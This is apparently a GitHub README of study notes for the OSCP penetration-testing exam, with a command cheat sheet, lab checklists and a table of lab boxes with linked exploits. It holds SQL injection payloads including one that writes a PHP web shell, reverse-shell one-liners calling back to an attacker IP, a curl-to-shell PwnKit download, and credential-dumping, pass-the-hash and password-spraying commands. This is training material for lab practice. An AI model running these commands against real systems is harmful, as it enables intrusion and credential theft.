# OSCP-Prep-Guide
A collection of labs, tools, and study materials for OSCP exam preparation. Includes practice environments, scripts, and resources for enumeration, exploitation, and privilege escalation to help master penetration testing skills.

## Tool and Cheat Sheet

### Linux Command
Check user's sudo permissions
```shell
sudo -l
```
Find the file
```shell
find / -iname "flag.txt" 2>/dev/null
```
Find all SUID file
```shell
find / -perm -u=s -type f 2>/dev/null
```
Find all the SUID/SGID executables
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

### SQL injection

#### Database info discovery
Version
```shell
# Microsoft or MySQL
@@version 
# PostgreSQL
version()
# SQLite
sqlite_version()
```

Show Tables
``` sql
-- SQLite
SELECT name FROM sqlite_master WHERE type = "table"
```
#### UNION attacks
Example
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
Determining the number of columns required
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc. 
```
Finding columns with a useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
[MySQL-SQLi-Login-Bypass.fuzzdb](https://github.com/danielmiessler/SecLists/blob/f47d52a4fcbceca53b72c9a3dc63a9f719ab0878/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt)
```
<username>' OR 1=1--
'OR '' = '	Allows authentication without a valid username.
<username>'--
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
'OR 1=1--
```
#### Get a Shell
```
' union select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php' -- -
```
### Scaning & Enumeration

#### [Nmap](https://nmap.org/)

Enumerate the users on a remote Windows system
```
nmap --script smb-enum-users.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
```

#### [enum4linux](https://www.kali.org/tools/enum4linux/)
a tool for enumerating information from Windows and Samba systems

#### [smbclient](https://www.samba.org/samba/docs/4.17/man-html/smbclient.1.html)
```shell
smbclient -L DOMAIN --user USER
```

#### [Nikto](https://github.com/sullo/nikto)
```
nitko -h IP
```

### Gaining Access

#### [GTFOBins](https://gtfobins.github.io/)
list of Unix binaries which can escalate privileges
#### [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
search for possible paths to escalate privileges on Linux
#### [Winpeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
search for possible paths to escalate privileges on Windows
#### [pspy](https://github.com/DominicBreuker/pspy)
unprivileged Linux process snooping
#### [Metasploit](https://github.com/rapid7/metasploit-framework)
#### [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/)
A modified version of the passing-the-hash tool collection

pth-winexe
```
pth-winexe -U 'admin%password123' //10.10.119.24 cmd.exe
```
### Maintaining Access

#### [xfreerdp](https://www.freerdp.com/)
RDP on Linux

enables clipboard, allows resize window, creates a shared drive between the attacking machine and the target
```shell
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```
#### [Penelope](https://github.com/brightio/penelope)
reverse shell

#### [evil-winrm](https://github.com/Hackplayers/evil-winrm)
The ultimate WinRM shell for hacking/pentesting

```shell
evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP 
```
pass hash
```shell
evil-winrm -u Administrator -H ADMIN_HASH -i IP
```

### Brute-force

#### [Hydra](https://www.kali.org/tools/hydra/)
Hydra is a parallelized login cracker which supports numerous protocols to attack
#### [john the ripper](https://www.openwall.com/john/)
John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems

```
zip2john XXX.zip > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### [hashcat](https://hashcat.net/hashcat/)
```
hashcat -m 18200 hash.txt passwordlist.txt --force
```

### Other

#### .ssh
The keys need to be read-writable only by you:
```
chmod 600 ~/.ssh/id_rsa
```

#### [impacket](https://github.com/fortra/impacket)
Impacket is a collection of Python classes for working with network protocols.

Kali default path: `/usr/share/doc/python3-impacket/examples`

Retrieving Kerberos Tickets
```shell
python3 GetNPUsers.py DOMAIN/USERNAME
```
Dump the hashes
```shell
python3 secretsdump.py DOMAIN/USERNAME:PASSWORD@IP
```
Kerberoasting
```shell
python3 GetUserSPNs.py DOMAIN/USERNAME:PASSWORD -dc-ip IP -request
```
#### [WADComs](https://wadcoms.github.io/#)
WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.

#### [git-dumper](https://github.com/arthaud/git-dumper)
A tool to dump a git repository from a website.
```
git-dumper http://bullybox.local/.git .
```

#### [SecLists](https://github.com/danielmiessler/SecLists/tree/master)
It's a collection of multiple types of lists used during security assessments, collected in one place.

### Reverse Shell via One-liner
```
sh -i >& /dev/tcp/$KaliIP/4444 0>&1
```
```
bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
```
```
nc $kaliIP 80 -e /bin/sh
```
#### perl
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$KaliIP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
### [CyberChef](https://gchq.github.io/CyberChef/)
a web app for encryption, encoding, compression and data analysis.

### [PwnKit](https://github.com/ly4k/PwnKit)
Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation
```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

### [wpscan](https://wpscan.com/)
```
wpscan --url $URL 

# bruteforce 
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames $USERNAME
```


### debugfs
list all 
```
df -h  
debugfs PATH
```

## Walkthrough Labs

### TryHackMe

#### Web attack and SQL injection
- [X] [[Easy] Walking An Application](https://tryhackme.com/room/walkinganapplication)
- [X] [[Easy] Web Enumeration](https://tryhackme.com/room/webenumerationv2)
- [X] [[Medium] SQL Injection](https://tryhackme.com/room/sqlinjectionlm)
- [X] [[Easy] SQL Injection Lab](https://tryhackme.com/room/sqlilab)
- [X] [[Easy] Authentication Bypass](https://tryhackme.com/jr/authenticationbypass)
- [X] [[Easy] IDOR](https://tryhackme.com/jr/idor)
- [X] [[Easy] SSRF](https://tryhackme.com/jr/ssrfqi)
- [X] [[Medium] File Inclusion](https://tryhackme.com/room/fileinc)
- [X] [[Easy] Intro to Cross-site Scripting](https://tryhackme.com/room/xss)
- [X] [[Easy] Command Injection](https://tryhackme.com/room/oscommandinjection)
- [X] [[Easy] Upload Vulnerabilities](https://tryhackme.com/jr/uploadvulns)
- [X] [[Info] Bypass Disable Functions](https://tryhackme.com/room/bypassdisablefunctions)

#### Linux Privilege Escalation
- [X] [[Easy] Linux: Local Enumeration](https://tryhackme.com/room/lle)
- [X] [[Easy] Enumeration](https://tryhackme.com/room/enumerationpe)
- [X] [[Medium] Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) 
- [X] [[Medium] Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
- [X] [[Info] Sudo Security Bypass](https://tryhackme.com/room/sudovulnsbypass)
- [X] [[Easy] Common Linux Privesc
](https://tryhackme.com/room/commonlinuxprivesc)
- [X] [[Easy] Vulnversity](https://tryhackme.com/room/vulnversity)
- [X] [[Easy] Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)
- [X] [[Easy] Bolt](https://tryhackme.com/room/bolt)

#### Windows Privilege Escalation
- [X] [[Easy] Enumeration](https://tryhackme.com/room/enumerationpe)
- [X] [[Medium] Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
- [X] [[Medium] Windows PrviEsc Arena](https://tryhackme.com/room/windowsprivesc20)
- [X] [[Easy] Vulnerabilities 101](https://tryhackme.com/jr/vulnerabilities101)
- [X] [[Easy] Exploit Vulnerabilities](https://tryhackme.com/jr/exploitingavulnerabilityv2)
- [X] [[Easy] Vulnerability Capstone](https://tryhackme.com/jr/vulnerabilitycapstone)
- [X] [[Easy] Intro PoC Scripting](https://tryhackme.com/room/intropocscripting)
- [X] [[Easy] Wreath](https://tryhackme.com/room/wreath)

#### Windows Active Directory Attack
- [X] [[Easy] Active Directory Basics](https://tryhackme.com/room/winadbasics)
- [X] [⭐️ [Medium] Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
- [X] [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)
- [ ] [Breaching Active Directory](https://tryhackme.com/room/breachingad)
- [ ] [AD Enumeration](https://tryhackme.com/room/adenumeration)
- [ ] [Lateral Movement and Pivoting](https://tryhackme.com/jr/lateralmovementandpivoting)
- [ ] [Exploiting Active Directory](https://tryhackme.com/room/exploitingad)
- [ ] [Post-Exploitation Basics](https://tryhackme.com/room/postexploit)
- [ ] [HoloLive](https://tryhackme.com/room/hololive)


### Hack The Box
- [ ] [Network Enumeration with Nmap](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap)
- [ ] [FootPrinting](https://academy.hackthebox.com/course/preview/footprinting)
- [ ] [Attacking Common Services](https://academy.hackthebox.com/course/preview/attacking-common-services)
- [ ] [Information Gathering Web Edition](https://academy.hackthebox.com/course/preview/information-gathering---web-edition)
- [ ] [Introduction to Web Applications](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
- [ ] [Web Attacks](https://academy.hackthebox.com/course/preview/web-attacks)
- [ ] [File Inclusion](https://academy.hackthebox.com/course/preview/file-inclusion)
- [ ] [Abusing HTTP Misconfigurations](https://academy.hackthebox.com/course/preview/abusing-http-misconfigurations)
- [ ] [HTTP Attacks](https://academy.hackthebox.com/course/preview/http-attacks)
- [ ] [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
- [ ] [Blind SQL Injection](https://academy.hackthebox.com/course/preview/blind-sql-injection)
- [ ] [Advanced SQL Injection](https://academy.hackthebox.com/course/preview/advanced-sql-injections)
- [ ] [Using Web Proxies](https://academy.hackthebox.com/course/preview/using-web-proxies)
- [ ] [Attacking Web Applications with ffuf](https://academy.hackthebox.com/course/preview/attacking-web-applications-with-ffuf)
- [ ] [Session Security](https://academy.hackthebox.com/course/preview/session-security)
- [ ] [Attacking Authentication Mecanism](https://academy.hackthebox.com/course/preview/attacking-authentication-mechanisms)
- [ ] [Web Service & API Attacks](https://academy.hackthebox.com/course/preview/web-service--api-attacks)
- [ ] [Broken Authentication](https://academy.hackthebox.com/course/preview/broken-authentication)
- [ ] [File Upload Attacks](https://academy.hackthebox.com/course/preview/file-upload-attacks)
- [ ] [Whitebox Pentesting 101: Command Injection](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection)
- [ ] [Command Injections](https://academy.hackthebox.com/course/preview/command-injections)
- [ ] [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
- [ ] [Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks)
- [ ] [Introduction to NoSQL Injection](https://academy.hackthebox.com/course/preview/introduction-to-nosql-injection)
- [ ] [Introduction to Deserialization Attacks](https://academy.hackthebox.com/course/preview/introduction-to-deserialization-attacks)
- [ ] [Linux Privilege Escalation](https://academy.hackthebox.com/course/preview/linux-privilege-escalation) 
- [ ] [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
- [ ] [File Transfers](https://academy.hackthebox.com/course/preview/file-transfers)
- [ ] [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)
- [ ] [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory)
- [ ] [Active Directory Enumeration Attacks](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
- [ ] [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap)
- [ ] [Active Directory PowerView](https://academy.hackthebox.com/course/preview/active-directory-powerview)
- [ ] [Active Directory BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound)
- [ ] [Kerberos Attacks](https://academy.hackthebox.com/course/preview/kerberos-attacks)
- [ ] [Using crackmapexec](https://academy.hackthebox.com/course/preview/using-crackmapexec)
- [ ] [Password Attacks](https://academy.hackthebox.com/course/preview/password-attacks)
- [ ] [Attacking Enterprise Networks](https://academy.hackthebox.com/course/preview/attacking-enterprise-networks)
- [ ] [Documentation & Reporting](https://academy.hackthebox.com/course/preview/documentation--reporting)

## Challenge Labs 

### Proving Grounds Play

#### Linux Box

- [ ] [Amaterasu]()
- [ ] [BBScute]()
- [ ] [Blogger]()
- [ ] [DC-9]()
- [X] [DriftingBlue6]()
- [X] [eLection]()
- [X] [FunboxEasyEnum]()
- [X] [Gaara]()
- [ ] [InsanityHosting]()
- [X] [Loly]()
- [ ] [Monitoring]()
- [X] [Potato]()
- [ ] [Stapler]()

### Proving Grounds Practice

#### Linux Box

The most commonly used tools
- NMAP
- linPEAS
- GTFOBins

|Lab| Difficulty| Recon| Access| Privilege Escalation|
| -- | -- | -- | -- | -- |
|Astronaut|Easy||[GravCMS Unauthenticated Arbitrary YAML Write/Update RCE - CVE-2021-21425](https://github.com/CsEnox/CVE-2021-21425)| `PHP`(SUID)|
|Blackgate|Intermediate|Redis|[Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) ||
|Bratarina|Easy| OpenSMTPD|[OpenSMTPD 6.6.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47984)||
|Bullybox|Intermediate|[git-dumper](https://github.com/arthaud/git-dumper#git-dumper) | [BoxBilling<=4.22.1.5 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51108)|`sudo`|
|ClamAV|Easy||[Sendmail with clamav-milter < 0.91.2 - Remote Command Execution](https://www.exploit-db.com/exploits/4761)
|Cockpit|Intermediate||SQL Injection|`tar` (SUID), edit `etc/sudoers`|
|Codo|Easy||upload reverse shell|root's password leaked (linPEAS)|
|Crane|Easy||[CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940?tab=readme-ov-file)|`sudo -l`, serice|
|Exfiltrated|Easy|default creds|[CVE-2018-19422-SubrionCMS-RCE](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE)|cron jobs, [Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution](https://github.com/UNICORDev/exploit-CVE-2021-22204)|
|Extplorer|Intermediate|dirsearch|upload reverse shell|`id`, `debugfs`, `john`|
|Fanatastic|Hard||[CVE-2021-43798 Grafana Unauthorized arbitrary file reading vulnerability](https://github.com/jas502n/Grafana-CVE-2021-43798)|
|Fired|Hard||[Openfire Console Authentication Bypass Vulnerability with RCE plugin - CVE-2023-32315](https://github.com/miko550/CVE-2023-32315)
|Flu|Intermediate||[CVE-2022-26134](https://github.com/jbaines-r7/through_the_wire)|`pspy`
|Hawat|Hard|dirsearsh|Sql injection, upload shell|
|Hub|Easy||[FuguHub 8.4 Authenticated RCE](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697)|
|Image|Easy||[RCE vulnerability affecting ImageMagick 6.9.6-4 - CVE-2023-34152](https://github.com/SudoIndividual/CVE-2023-34152)|`strace` (SUID)|
|Jordak|Easy||[CVE-2023-26469](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py)|`env` (SUID)|
|law|Intermediate||[GLPI htmlawed (CVE-2022-35914)](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)|`pspy`, edit `cleanup.sh`|
|Levram|Easy||[Gerapy 0.9.7 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50640)|`Python`
|Mzeeav|Easy|dirsearch|bypass upload shell|`fileS` (SUID)|
|Nibbles|Intermediate|PostgreSQL|[PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50847)|`find` (SUID)|
|Ochima|Intermediate||[Maltrail v0.53 Unauthenticated OS Command Injection (RCE)](https://github.com/spookier/Maltrail-v0.53-Exploit)|`echo 'echo "snort ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> etc_Backup.s|
|PC|Intermediate|||[rpc.py 0.6.0 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50983)|
|Pelican|Intermediate||[Exhibitor Web UI 1.7.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48654)|`gcore` (SUID)|
|Press|Intermediate|default creds|[Flatpress 1.2.1 - File upload bypass to RCE](https://github.com/flatpressblog/flatpress/issues/152?source=post_page-----93c6d096bae6---------------------------------------)|apt-get (Sudo)|
|pyLoader|Easy||[CVE-2023-0297](https://github.com/JacobEbben/CVE-2023-0297/blob/main/exploit.py)|
|QuackerJack|Intermediate||[rConfig 3.9 - 'searchColumn' SQL Injection](https://www.exploit-db.com/exploits/48208), [rConfig 3.9.3 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/47982)|`find` (SUID)|
|RubyDome|Intermediate||[pdfkit v0.8.7.2 - Command Injection](https://www.exploit-db.com/exploits/51293)|`irb` (shell)
|Snookums|Intermediate||[Remote File Inclusion](https://github.com/beauknowstech/SimplePHPGal-RCE.py)|PwnKit|
|Sorcerer|Intermediate|Dirsearch| SSH, SCP|`start-stop-daemon` (SUID)|
|Twiggy|Intermediate|ZeroMQ ZMTP 2.0|[Saltstack 3000.1 - CVE-2020-11651, CVE-2020-11652](https://github.com/Al1ex/CVE-2020-11652)||
|Walla|Intermediate|default creds|[RaspAP 2.5 RCE - CVE-2020-24572](https://github.com/gerbsec/CVE-2020-24572-POC)|`sudo -l`, replace python file|
|Wombo|Intermediate|Redis|[Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)||
|ZenPhoto|Intermediate|Dirsearch|[ZenPhoto 1.4.1.4 RCE - CVE-2011-4825](https://www.exploit-db.com/exploits/18083)|[rds - CVE-2010-3904](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2010/CVE-2010-3904)|

- [ ] [Apex]()
- [ ] [BitForge]()
- [ ] [Boolean]()
- [ ] [Clue]()
- [ ] [Fired]()
- [ ] [Hetemit]()
- [ ] [Hunit]()
- [ ] [Lavita]()
- [ ] [Mantis]()
- [ ] [Marketing]()
- [ ] [Nukem]()
- [ ] [Payday]()
- [ ] [Pebbles]()
- [ ] [Peppo]()
- [ ] [Plum]()
- [ ] [Postfish]()
- [ ] [Readys]()
- [ ] [Roquefort]()
- [ ] [Scrutiny]()
- [ ] [SPX]()
- [ ] [Sybaris]()
- [ ] [Vmdak]()
- [ ] [WallpaperHub]()
- [ ] [Xposedapi]()
- [ ] [Zab]()
- [ ] [Zipper]()

#### Windows Box
- [ ] [Algernon]()
- [ ] [Authby]()
- [ ] [Billyboss]()
- [ ] [Craft]()
- [ ] [DVR4]()
- [ ] [Fish]()
- [ ] [Helpdesk]()
- [ ] [Hepet]()
- [ ] [Hutch]()
- [ ] [Internal]()
- [ ] [Jacko]()
- [ ] [Kevin]()
- [ ] [MedJed]()
- [ ] [Mice]()
- [ ] [Monster]()
- [ ] [Nickel]()
- [ ] [Resourced]()
- [ ] [Shenzi]()
- [ ] [Slort]()
- [ ] [Squid]()

#### Windows Active Directory
- [ ] [Access]()
- [ ] [Heist]()
- [ ] [Hokkaido]()
- [ ] [Hutch]()
- [ ] [Nagoya]()
- [ ] [Resourced]()
- [ ] [Vault]()

#### Try Harder
- [ ] [Nagoya [Windows]]()
- [ ] [Osaka [Windows]]()
- [ ] [ProStore [Linux]]()
- [ ] [RPC1 [Linux]]()
- [ ] [Symbolic [Windows]]()
- [ ] [Upsploit [Linux]]()
- [ ] [Validator [Linux]]()
- [ ] [GLPI [Linux]]()
- [ ] [Marshalled [Linux]]()
- [ ] [Educated [Linux]]()
- [ ] [Kyoto [Windows Buffer Overflow]]()
- [ ] [Nara [Windows Active Directory]]()

### Vlunlab

#### Linux Box

- [ ] [Bamboo]()
- [ ] [Build]()
- [ ] [Data]()
- [ ] [Dump]()
- [ ] [Feedback]()
- [ ] [Forgotten]()
- [ ] [Sync]()

#### Windows Box

#### Windows Active Directory

#### Try Harder

## Draft
### Kerberos Authentication Overview
![](https://i.imgur.com/VRr2B6w.png)
### Attack Privilege Requirements
- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
    - Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
- AS-REP Roasting - Access as any user required
    - AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required

### Enumerating Users Kerbrute
#### [Kerbrute](https://github.com/ropnop/kerbrute)
A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

User Enumeration
```shell
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
```

Password Spray
```shell
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
```
#### [Rubeus](https://github.com/GhostPack/Rubeus)
Rubeus is a C# toolset for raw Kerberos interaction and abuses.

Harvesting Tickets (harvest for TGTs every 30 seconds)
```shell
rubeus.exe harvest /interval:30
```
Brute-Forcing/Password-Spraying
```shell
rubeus.exe brute /password:Password1 /noticket
```
Kerberoasting
```shell
rubeus.exe kerberoast
```
Dumping KRBASREP5 Hashes
```shell
rubeus.exe asreproast
```
#### [Mimikatz](https://github.com/ParrotSec/mimikatz)
It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.

Kerberos Backdoors 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"



## Reference
- https://github.com/rodolfomarianocy/OSCP-Tricks-2023
- https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt
- https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8
- https://portswigger.net/
- https://tryhackme.com/
